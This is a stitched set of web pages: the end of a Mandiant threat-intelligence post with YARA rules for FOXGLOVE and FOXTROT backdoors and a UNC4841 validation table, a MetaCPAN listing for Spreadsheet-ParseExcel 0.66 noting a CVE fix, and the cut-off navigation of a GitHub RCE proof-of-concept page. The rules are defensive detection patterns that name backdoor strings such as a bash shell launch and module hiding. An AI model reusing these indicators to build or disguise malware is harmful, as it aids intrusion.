rule M_APT_Launcher_FOXGLOVE_1 {

meta:
  author = "Mandiant"
  md5 = "c9ae8bfd08f57d955465f23a5f1c09a4"

strings:
  $str1 = { 48 ?? 66 6F 78 64 6F 6F 72 5F 48 89 ?? C7 ?? ?? 73 68 65 6C 66 C7 ?? ?? 6C 00 }
  $str2 = { 48 ?? 2F 75 73 72 2F 73 68 61 48 ?? 72 65 2F 66 6F 78 64 6F 48 89 ?? 48 89 ?? ?? 48 ?? 6F 72 2F 66 6F 78 64 6F 48 ?? 6F 72 5F 73 68 65 6C 6C }
  $str3 = "shell"
  $str4 = "start.c"
  $str5 = "base64en"
  $str6 = "base64de"
  $str7 = "-r"
  $str8 = "-s"
  $str9 = "-p"
  $str10 = "-t"

condition:
  uint32(0) == 0x464c457f and all of them
}
```
FOXGLOVE

```
rule M_APT_Backdoor_FOXTROT_1 {

meta:
  author = "Mandiant"
  md5 = "a28de396aa91b7faca35e861b634c502"

strings:
  $str1 = "/usr/share/foxdoor/uuid"
  $str2 = "/.mozilla/firefox/"
  $str3 = "hide_foxdoor_mod"
  $str4 = "POST /api/index.cgi"
  $str5 = "7(Zu9YTsA7qQ#vw"
  $str6 = "CONNECT %s:%d HTTP/1.1"
  $str7 = "network.proxy.http_port"
  $str8 = "exec bash --rcfile"

condition:
  uint32(0) == 0x464c457f and all of them
}
```
FOXTROT

Mandiant Security Validation Actions

Organizations can validate their security controls using the following actions with [Mandiant Security Validation](https://cloud.google.com/security/products/mandiant-security-validation).

| **VID** | **Name** |
| --- | --- |
| A106-709  Command and Control | UNC4841, DNS Query, Variant #10  A106-710 |
| A106-710  Command and Control | UNC4841, DNS Query, Variant #2 |
| A106-711  Command and Control | UNC4841, DNS Query, Variant #3 |
| A106-712  Command and Control | UNC4841, DNS Query, Variant #11 |
| A106-713  Command and Control | UNC4841, DNS Query, Variant #4 |
| A106-714  Command and Control | UNC4841, DNS Query, Variant #5 |
| A106-715  Command and Control | UNC4841, DNS Query, Variant #8 |
| A106-716  Command and Control | UNC4841, DNS Query, Variant #7 |
| A106-717  Command and Control | UNC4841, DNS Query, Variant #6 |
| A106-718  Command and Control | UNC4841, DNS Query, Variant #9 |
| A106-719  Malicious File Transfer | UNC4841, DEPTHCHARGE, Download, Variant #1 |
| A106-720  Malicious File Transfer | UNC4841, SALTWATER, Download, Variant #2 |
| A106-721  Malicious File Transfer | UNC4841, FOXTROT, Download, Variant #1 |
| A106-722  Malicious File Transfer | UNC4841, SKIPJACK, Download, Variant #2 |

Posted in

* [Threat Intelligence](https://cloud.google.com/blog/topics/threat-intelligence)
##### Related articles

[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Backscatter: Automated Configuration Extraction

By Mandiant • 4-minute read](https://cloud.google.com/blog/topics/threat-intelligence/backscatter-automated-configuration-extraction)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Ivanti Connect Secure VPN Targeted in New Zero-Day Exploitation

By Mandiant • 28-minute read](https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### XRefer: The Gemini-Assisted Binary Navigator

By Mandiant • 26-minute read](https://cloud.google.com/blog/topics/threat-intelligence/xrefer-gemini-assisted-binary-navigator)[![https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png)Threat Intelligence
### Bridging the Gap: Elevating Red Team Assessments with Application Security Testing

By Mandiant • 13-minute read](https://cloud.google.com/blog/topics/threat-intelligence/red-team-application-security-testing)

=== Content from metacpan.org_4639df76_20250115_091033.html ===


* [About](/about)
* [Sponsor](/about/sponsors)
* [grep::cpan](https://grep.metacpan.org/)
* [Recent](/recent)
* [FAQ](/about/faq)
* [Tools](/tools)
* [API](https://fastapi.metacpan.org/)

* + [Identities](/account/identities)
  + [Profile](/account/profile)
  + [Favorites](/account/favorite/list)
  + Logout
* + [GitHub](/login/github)
  + [Twitter](/login/twitter)
  + [Google](/login/google)

* 29 Dec 2023 01:14:58 UTC
* [Browse](/dist/Spreadsheet-ParseExcel/source) ([raw](/dist/Spreadsheet-ParseExcel/source?raw=1))
* [Changes](/dist/Spreadsheet-ParseExcel/changes)
* [Homepage](http://github.com/jmcnamara/spreadsheet-parseexcel/)
* [How to Contribute](/dist/Spreadsheet-ParseExcel/contribute)
* [Repository](https://github.com/jmcnamara/spreadsheet-parseexcel)
* [Issues](http://github.com/jmcnamara/spreadsheet-parseexcel/issues)
  (1)
* [Testers](http://matrix.cpantesters.org/?dist=Spreadsheet-ParseExcel+0.66 "Matrix")
  ([1982](https://www.cpantesters.org/distro/S/Spreadsheet-ParseExcel.html?oncpan=1&distmat=1&version=0.66&grade=2) / [1](https://www.cpantesters.org/distro/S/Spreadsheet-ParseExcel.html?oncpan=1&distmat=1&version=0.66&grade=3) / [0](https://www.cpantesters.org/distro/S/Spreadsheet-ParseExcel.html?oncpan=1&distmat=1&version=0.66&grade=4))
* [Kwalitee](http://cpants.cpanauthors.org/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66)
* Bus factor: 1
* License: perl\_5
* Activity
* ![](/dist/Spreadsheet-ParseExcel/activity.svg?res=month)
  24 month
* Tools
* [Download (203.38KB)](https://cpan.metacpan.org/authors/id/J/JM/JMCNAMARA/Spreadsheet-ParseExcel-0.66.tar.gz)
* [MetaCPAN Explorer](https://explorer.metacpan.org/?url=%2Frelease%2FJMCNAMARA%2FSpreadsheet-ParseExcel-0.66)
* [Permissions](/dist/Spreadsheet-ParseExcel/permissions)
* [Subscribe to distribution](/dist/Spreadsheet-ParseExcel/releases.rss)
* Install Instructions
* Jump to version
  0.66
  (JMCNAMARA on 2023-12-29)
  0.65
  (DOUGW on 2014-03-18)
  0.64
  (DOUGW on 2014-03-11)
  0.63
  (DOUGW on 2014-03-07)
  0.62
  (DOUGW on 2014-03-05)
  0.61
  (DOUGW on 2014-03-04)
  0.60
  (DOUGW on 2014-02-26)
  0.2603
  (KWITKNR on 2004-05-30)
  0.2602
  (KWITKNR on 2002-07-16)
  0.2601
  (KWITKNR on 2002-07-13)
  0.26
  (KWITKNR on 2002-06-05)
  0.25
  (KWITKNR on 2002-05-09)
  '
  0.59
  (JMCNAMARA on 2011-04-06)
  0.58
  (JMCNAMARA on 2010-09-17)
  0.57
  (JMCNAMARA on 2010-01-24)
  0.56
  (JMCNAMARA on 2009-12-10)
  0.55
  (JMCNAMARA on 2009-09-30)
  0.54
  (JMCNAMARA on 2009-08-25)
  0.53
  (JMCNAMARA on 2009-08-24)
  0.52
  (JMCNAMARA on 2009-08-21)
  0.51
  (JMCNAMARA on 2009-08-19)
  0.50
  (JMCNAMARA on 2009-08-18)
  0.49
  (JMCNAMARA on 2009-01-24)
  0.48
  (JMCNAMARA on 2009-01-23)
  0.47
  (JMCNAMARA on 2009-01-22)
  0.46
  (JMCNAMARA on 2009-01-20)
  0.45
  (JMCNAMARA on 2009-01-14)
  0.44
  (JMCNAMARA on 2009-01-09)
  0.43
  (JMCNAMARA on 2009-01-08)
  0.42
  (JMCNAMARA on 2009-01-01)
  0.41
  (JMCNAMARA on 2008-10-24)
  0.40
  (JMCNAMARA on 2008-10-24)
  0.33
  (SZABGAB on 2008-09-07)
  0.32
  (SZABGAB on 2007-05-05)
  0.31
  (SZABGAB on 2007-05-03)
  0.30
  (SZABGAB on 2007-03-31)
  0.29
  (SZABGAB on 2007-03-29)
  0.28
  (SZABGAB on 2007-01-07)
  0.27
  (SZABGAB on 2007-01-03)
  0.27\_03 DEV
  (SZABGAB on 2006-11-02)
  0.27\_02 DEV
  (SZABGAB on 2006-09-12)
  0.27\_01 DEV
  (SZABGAB on 2006-09-11)
  0.2407
  (KWITKNR on 2002-04-24)
  0.2406
  (KWITKNR on 2002-04-07)
  0.2405
  (KWITKNR on 2002-01-28)
  0.2404
  (KWITKNR on 2001-12-06)
  0.2403
  (KWITKNR on 2001-07-24)
  0.2402
  (KWITKNR on 2001-07-13)
  0.24
  (KWITKNR on 2001-07-05)
  0.2301
  (KWITKNR on 2001-06-26)
  0.23
  (KWITKNR on 2001-06-21)
  0.22.3
  (KWITKNR on 2001-06-05)
  0.22.2
  (KWITKNR on 2001-05-24)
  0.22.1
  (KWITKNR on 2001-05-15)
  0.22
  (KWITKNR on 2001-05-05)
  0.21.2
  (KWITKNR on 2001-05-01)
  0.21.1
  (KWITKNR on 2001-04-29)
  0.21
  (KWITKNR on 2001-04-28)
  0.20.1
  (KWITKNR on 2001-04-11)
  0.201
  (KWITKNR on 2001-04-11)
  0.20
  (KWITKNR on 2001-03-30)
  0.19
  (KWITKNR on 2001-03-26)
  0.18
  (KWITKNR on 2001-03-17)
  0.17
  (KWITKNR on 2001-03-12)
  0.16
  (KWITKNR on 2001-03-07)
  0.15
  (KWITKNR on 2001-03-06)
  0.13
  (KWITKNR on 2001-02-22)
  0.12
  (KWITKNR on 2001-02-05)
  0.11
  (KWITKNR on 2001-01-31)
  0.10
  (KWITKNR on 2001-01-16)
  0.09
  (KWITKNR on 2000-12-15)
  0.08
  (KWITKNR on 2000-11-24)
  0.07
  (KWITKNR on 2000-11-18)
  0.06
  (KWITKNR on 2000-10-06)
* Diff with version
  0.66
  (JMCNAMARA on 2023-12-29)
  0.65
  (DOUGW on 2014-03-18)
  0.64
  (DOUGW on 2014-03-11)
  0.63
  (DOUGW on 2014-03-07)
  0.62
  (DOUGW on 2014-03-05)
  0.61
  (DOUGW on 2014-03-04)
  0.60
  (DOUGW on 2014-02-26)
  0.2603
  (KWITKNR on 2004-05-30)
  0.2602
  (KWITKNR on 2002-07-16)
  0.2601
  (KWITKNR on 2002-07-13)
  0.26
  (KWITKNR on 2002-06-05)
  0.25
  (KWITKNR on 2002-05-09)
  '
  0.59
  (JMCNAMARA on 2011-04-06)
  0.58
  (JMCNAMARA on 2010-09-17)
  0.57
  (JMCNAMARA on 2010-01-24)
  0.56
  (JMCNAMARA on 2009-12-10)
  0.55
  (JMCNAMARA on 2009-09-30)
  0.54
  (JMCNAMARA on 2009-08-25)
  0.53
  (JMCNAMARA on 2009-08-24)
  0.52
  (JMCNAMARA on 2009-08-21)
  0.51
  (JMCNAMARA on 2009-08-19)
  0.50
  (JMCNAMARA on 2009-08-18)
  0.49
  (JMCNAMARA on 2009-01-24)
  0.48
  (JMCNAMARA on 2009-01-23)
  0.47
  (JMCNAMARA on 2009-01-22)
  0.46
  (JMCNAMARA on 2009-01-20)
  0.45
  (JMCNAMARA on 2009-01-14)
  0.44
  (JMCNAMARA on 2009-01-09)
  0.43
  (JMCNAMARA on 2009-01-08)
  0.42
  (JMCNAMARA on 2009-01-01)
  0.41
  (JMCNAMARA on 2008-10-24)
  0.40
  (JMCNAMARA on 2008-10-24)
  0.33
  (SZABGAB on 2008-09-07)
  0.32
  (SZABGAB on 2007-05-05)
  0.31
  (SZABGAB on 2007-05-03)
  0.30
  (SZABGAB on 2007-03-31)
  0.29
  (SZABGAB on 2007-03-29)
  0.28
  (SZABGAB on 2007-01-07)
  0.27
  (SZABGAB on 2007-01-03)
  0.27\_03 DEV
  (SZABGAB on 2006-11-02)
  0.27\_02 DEV
  (SZABGAB on 2006-09-12)
  0.27\_01 DEV
  (SZABGAB on 2006-09-11)
  0.2407
  (KWITKNR on 2002-04-24)
  0.2406
  (KWITKNR on 2002-04-07)
  0.2405
  (KWITKNR on 2002-01-28)
  0.2404
  (KWITKNR on 2001-12-06)
  0.2403
  (KWITKNR on 2001-07-24)
  0.2402
  (KWITKNR on 2001-07-13)
  0.24
  (KWITKNR on 2001-07-05)
  0.2301
  (KWITKNR on 2001-06-26)
  0.23
  (KWITKNR on 2001-06-21)
  0.22.3
  (KWITKNR on 2001-06-05)
  0.22.2
  (KWITKNR on 2001-05-24)
  0.22.1
  (KWITKNR on 2001-05-15)
  0.22
  (KWITKNR on 2001-05-05)
  0.21.2
  (KWITKNR on 2001-05-01)
  0.21.1
  (KWITKNR on 2001-04-29)
  0.21
  (KWITKNR on 2001-04-28)
  0.20.1
  (KWITKNR on 2001-04-11)
  0.201
  (KWITKNR on 2001-04-11)
  0.20
  (KWITKNR on 2001-03-30)
  0.19
  (KWITKNR on 2001-03-26)
  0.18
  (KWITKNR on 2001-03-17)
  0.17
  (KWITKNR on 2001-03-12)
  0.16
  (KWITKNR on 2001-03-07)
  0.15
  (KWITKNR on 2001-03-06)
  0.13
  (KWITKNR on 2001-02-22)
  0.12
  (KWITKNR on 2001-02-05)
  0.11
  (KWITKNR on 2001-01-31)
  0.10
  (KWITKNR on 2001-01-16)
  0.09
  (KWITKNR on 2000-12-15)
  0.08
  (KWITKNR on 2000-11-24)
  0.07
  (KWITKNR on 2000-11-18)
  0.06
  (KWITKNR on 2000-10-06)
* + Dependencies
  + [Crypt::RC4](/pod/Crypt%3A%3ARC4 "Crypt::RC4")
  + [Digest::Perl::MD5](/pod/Digest%3A%3APerl%3A%3AMD5 "Digest::Perl::MD5")
  + [IO::File](/pod/IO%3A%3AFile "IO::File")
  + [IO::Scalar](/pod/IO%3A%3AScalar "IO::Scalar")
  + [OLE::Storage\_Lite](/pod/OLE%3A%3AStorage_Lite "OLE::Storage_Lite")
  + [Scalar::Util](/pod/Scalar%3A%3AUtil "Scalar::Util")
  + *and possibly others*
  + ---
  + [Reverse dependencies](/dist/Spreadsheet-ParseExcel/requires)
  + [CPAN Testers List](http://deps.cpantesters.org/?module=Spreadsheet%3A%3AParseExcel)
  + [Dependency graph](https://cpandeps.grinnz.com/?dist=Spreadsheet-ParseExcel)
* Permalinks
* [This version](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66)
* [Latest version](/dist/Spreadsheet-ParseExcel)
* ++ed by:
  [![AZJADFTRE](https://www.gravatar.com/avatar/104622f129da1a6299bef66eb98c6e0e?d=identicon&s=20 "AZJADFTRE")](/author/AZJADFTRE)
  [![WKI](https://www.gravatar.com/avatar/96e6cbd6079af929f3531d41081b9be1?d=identicon&s=20 "WKI")](/author/WKI)
  [![MISHIN](https://www.gravatar.com/avatar/7aefe037fc617ef89780ad89de3deb87?d=identicon&s=20 "MISHIN")](/author/MISHIN)
  [![SZABGAB](https://www.gravatar.com/avatar/4e0a6fe2acda5df6095514e7d6329e91?d=identicon&s=20 "SZABGAB")](/author/SZABGAB)
  [![KABLAMO](https://www.gravatar.com/avatar/6c59a99ff976dc69fe31f1fe3bf6dc01?d=identicon&s=20 "KABLAMO")](/author/KABLAMO)

  [14 PAUSE users](/dist/Spreadsheet-ParseExcel/plussers)

  26 non-PAUSE users
* and 1 contributors
  + John McNamara (jmcnamara@cpan.org)

[John McNamara](/author/JMCNAMARA)

 /

0.66
(JMCNAMARA on 2023-12-29)
0.65
(DOUGW on 2014-03-18)
0.64
(DOUGW on 2014-03-11)
0.63
(DOUGW on 2014-03-07)
0.62
(DOUGW on 2014-03-05)
0.61
(DOUGW on 2014-03-04)
0.60
(DOUGW on 2014-02-26)
0.2603
(KWITKNR on 2004-05-30)
0.2602
(KWITKNR on 2002-07-16)
0.2601
(KWITKNR on 2002-07-13)
0.26
(KWITKNR on 2002-06-05)
0.25
(KWITKNR on 2002-05-09)
'
0.59
(JMCNAMARA on 2011-04-06)
0.58
(JMCNAMARA on 2010-09-17)
0.57
(JMCNAMARA on 2010-01-24)
0.56
(JMCNAMARA on 2009-12-10)
0.55
(JMCNAMARA on 2009-09-30)
0.54
(JMCNAMARA on 2009-08-25)
0.53
(JMCNAMARA on 2009-08-24)
0.52
(JMCNAMARA on 2009-08-21)
0.51
(JMCNAMARA on 2009-08-19)
0.50
(JMCNAMARA on 2009-08-18)
0.49
(JMCNAMARA on 2009-01-24)
0.48
(JMCNAMARA on 2009-01-23)
0.47
(JMCNAMARA on 2009-01-22)
0.46
(JMCNAMARA on 2009-01-20)
0.45
(JMCNAMARA on 2009-01-14)
0.44
(JMCNAMARA on 2009-01-09)
0.43
(JMCNAMARA on 2009-01-08)
0.42
(JMCNAMARA on 2009-01-01)
0.41
(JMCNAMARA on 2008-10-24)
0.40
(JMCNAMARA on 2008-10-24)
0.33
(SZABGAB on 2008-09-07)
0.32
(SZABGAB on 2007-05-05)
0.31
(SZABGAB on 2007-05-03)
0.30
(SZABGAB on 2007-03-31)
0.29
(SZABGAB on 2007-03-29)
0.28
(SZABGAB on 2007-01-07)
0.27
(SZABGAB on 2007-01-03)
0.27\_03 DEV
(SZABGAB on 2006-11-02)
0.27\_02 DEV
(SZABGAB on 2006-09-12)
0.27\_01 DEV
(SZABGAB on 2006-09-11)
0.2407
(KWITKNR on 2002-04-24)
0.2406
(KWITKNR on 2002-04-07)
0.2405
(KWITKNR on 2002-01-28)
0.2404
(KWITKNR on 2001-12-06)
0.2403
(KWITKNR on 2001-07-24)
0.2402
(KWITKNR on 2001-07-13)
0.24
(KWITKNR on 2001-07-05)
0.2301
(KWITKNR on 2001-06-26)
0.23
(KWITKNR on 2001-06-21)
0.22.3
(KWITKNR on 2001-06-05)
0.22.2
(KWITKNR on 2001-05-24)
0.22.1
(KWITKNR on 2001-05-15)
0.22
(KWITKNR on 2001-05-05)
0.21.2
(KWITKNR on 2001-05-01)
0.21.1
(KWITKNR on 2001-04-29)
0.21
(KWITKNR on 2001-04-28)
0.20.1
(KWITKNR on 2001-04-11)
0.201
(KWITKNR on 2001-04-11)
0.20
(KWITKNR on 2001-03-30)
0.19
(KWITKNR on 2001-03-26)
0.18
(KWITKNR on 2001-03-17)
0.17
(KWITKNR on 2001-03-12)
0.16
(KWITKNR on 2001-03-07)
0.15
(KWITKNR on 2001-03-06)
0.13
(KWITKNR on 2001-02-22)
0.12
(KWITKNR on 2001-02-05)
0.11
(KWITKNR on 2001-01-31)
0.10
(KWITKNR on 2001-01-16)
0.09
(KWITKNR on 2000-12-15)
0.08
(KWITKNR on 2000-11-24)
0.07
(KWITKNR on 2000-11-18)
0.06
(KWITKNR on 2000-10-06)

Spreadsheet-ParseExcel-0.66

 River stage two
• 44 direct dependents
• 70 total dependents

40 ++

40 ++

## Changes for version 0.66

* ! Fix for CVE-2023-7101 https://github.com/runrig/spreadsheet-parseexcel/issues/33

[ Show lessShow more ]

## Modules

[Spreadsheet::ParseExcel](/pod/Spreadsheet%3A%3AParseExcel)
Read information from an Excel file.

[Spreadsheet::ParseExcel::Cell](/pod/Spreadsheet%3A%3AParseExcel%3A%3ACell)
A class for Cell data and formatting.

[Spreadsheet::ParseExcel::Dump](/pod/Spreadsheet%3A%3AParseExcel%3A%3ADump)
A class for dumping Excel records.

[Spreadsheet::ParseExcel::FmtDefault](/pod/Spreadsheet%3A%3AParseExcel%3A%3AFmtDefault)
A class for Cell formats.

[Spreadsheet::ParseExcel::FmtJapan](/pod/Spreadsheet%3A%3AParseExcel%3A%3AFmtJapan)
A class for Cell formats.

[Spreadsheet::ParseExcel::FmtJapan2](/pod/Spreadsheet%3A%3AParseExcel%3A%3AFmtJapan2)
A class for Cell formats.

[Spreadsheet::ParseExcel::FmtUnicode](/pod/Spreadsheet%3A%3AParseExcel%3A%3AFmtUnicode)
A class for Cell formats.

[Spreadsheet::ParseExcel::Font](/pod/Spreadsheet%3A%3AParseExcel%3A%3AFont)
A class for Cell fonts.

[Spreadsheet::ParseExcel::Format](/pod/Spreadsheet%3A%3AParseExcel%3A%3AFormat)
A class for Cell formats.

[Spreadsheet::ParseExcel::SaveParser](/pod/Spreadsheet%3A%3AParseExcel%3A%3ASaveParser)
Rewrite an existing Excel file.

[Spreadsheet::ParseExcel::SaveParser::Workbook](/pod/Spreadsheet%3A%3AParseExcel%3A%3ASaveParser%3A%3AWorkbook)
A class for SaveParser Workbooks.

[Spreadsheet::ParseExcel::SaveParser::Worksheet](/pod/Spreadsheet%3A%3AParseExcel%3A%3ASaveParser%3A%3AWorksheet)
A class for SaveParser Worksheets.

[Spreadsheet::ParseExcel::Utility](/pod/Spreadsheet%3A%3AParseExcel%3A%3AUtility)
Utility functions for Spreadsheet::ParseExcel.

[Spreadsheet::ParseExcel::Workbook](/pod/Spreadsheet%3A%3AParseExcel%3A%3AWorkbook)
A class for Workbooks.

[Spreadsheet::ParseExcel::Worksheet](/pod/Spreadsheet%3A%3AParseExcel%3A%3AWorksheet)
A class for Worksheets.

## Examples

* [examples/a\_simple\_parser.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/examples/a_simple_parser.pl)
* [examples/display\_text\_table.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/examples/display_text_table.pl)
* [sample/Excel/AuthorK.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/AuthorK.xls)
* [sample/Excel/AuthorK95.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/AuthorK95.xls)
* [sample/Excel/FmtTest.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/FmtTest.xls)
* [sample/Excel/Rich.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Rich.xls)
* [sample/Excel/Test1904.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Test1904.xls)
* [sample/Excel/Test1904\_95.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Test1904_95.xls)
* [sample/Excel/Test95.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Test95.xls)
* [sample/Excel/Test95J.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Test95J.xls)
* [sample/Excel/Test97.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Test97.xls)
* [sample/Excel/Test97J.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/Test97J.xls)
* [sample/Excel/oem.xls](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Excel/oem.xls)
* [sample/Ilya.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/Ilya.pl)
* [sample/README](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/README)
* [sample/chkFmt.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/chkFmt.pl)
* [sample/chkInfo.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/chkInfo.pl)
* [sample/dmpEx.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpEx.pl)
* [sample/dmpExH.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpExH.pl)
* [sample/dmpExHJ.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpExHJ.pl)
* [sample/dmpExJ.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpExJ.pl)
* [sample/dmpExR.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpExR.pl)
* [sample/dmpExU.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpExU.pl)
* [sample/dmpEx\_2xml.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/dmpEx_2xml.pl)
* [sample/iftest.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/iftest.pl)
* [sample/iftestj.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/iftestj.pl)
* [sample/parse.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/parse.pl)
* [sample/sample.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/sample.pl)
* [sample/sampleOEM.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/sampleOEM.pl)
* [sample/sample\_j.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/sample_j.pl)
* [sample/smpFile.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/smpFile.pl)
* [sample/xls2csv.pl](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/sample/xls2csv.pl)

## Other files

* [Changes](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/Changes)
* [MANIFEST](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/MANIFEST)
* [META.json](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/META.json)
* [META.yml](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/META.yml)
* [Makefile.PL](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/Makefile.PL)
* [README](/release/JMCNAMARA/Spreadsheet-ParseExcel-0.66/source/README)

×
#### Module Install Instructions

To install Spreadsheet::ParseExcel, copy and paste the appropriate command in to your terminal.

[cpanm](/dist/App-cpanminus/view/bin/cpanm)

```
cpanm Spreadsheet::ParseExcel
```

[CPAN shell](/pod/CPAN)

```
perl -MCPAN -e shell
install Spreadsheet::ParseExcel
```

For more information on module installation, please visit [the detailed CPAN module installation guide](https://www.cpan.org/modules/INSTALL.html).

Close

[![MetaCPAN](/static/images/metacpan-logo.svg)](/)

[About](/about)

[Sponsor](/about/sponsors)

[grep::cpan](https://grep.metacpan.org)

[Recent](/recent)

[FAQ](/about/faq)

[Tools](/tools)

[API](https://fastapi.metacpan.org/)

[Perl.org](https://www.perl.org/)

[![Bytemark logo](/static/images/sponsors/bytemark_logo.svg)](https://www.bytemark.co.uk/)
[![liquidweb logo](/static/images/sponsors/liquidweb_logo.png)](https://www.liquidweb.com/)
[![Deriv logo](/static/images/sponsors/deriv.svg)](https://deriv.com/careers/)
[![Geocode logo](/static/images/sponsors/geocodelogo.svg)](https://geocode.xyz)
[![Fastly logo](/static/images/sponsors/fastly_logo.svg)](https://www.fastly.com/)
[![OpenCage logo](/static/images/sponsors/open-cage.svg)](https://opencagedata.com)

[![Elastic logo](/static/images/sponsors/elastic.svg)](https://www.elastic.co/)

[![Route4Me logo](/static/images/sponsors/route4me.png)](https://route4me.com/)

×
#### Keyboard Shortcuts

|  | Global |
| --- | --- |
| `s` | Focus search bar |
| `?` | Bring up this help dialog |

|  | GitHub |
| --- | --- |
| `g` `p` | Go to pull requests |
| `g` `i` | go to github issues (only if github is preferred repository) |

|  | POD |
| --- | --- |
| `g` `a` | Go to author |
| `g` `c` | Go to changes |
| `g` `i` | Go to issues |
| `g` `d` | Go to dist |
| `g` `r` | Go to repository/SCM |
| `g` `s` | Go to source |
| `g` `b` | Go to file browse |

|  | Search terms |
| --- | --- |
| *module:* (e.g. [module:Plugin](/search?q=module%3APlugin)) |
| *distribution:* (e.g. [distribution:Dancer auth](/search?q=distribution%3ADancer+auth)) |
| *author:* (e.g. [author:SONGMU Redis](/search?q=author%3ASONGMU+Redis)) |
| *version:* (e.g. [version:1.00](/search?q=version%3A1.00)) |



=== Content from github.com_df7ecf32_20250115_091028.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
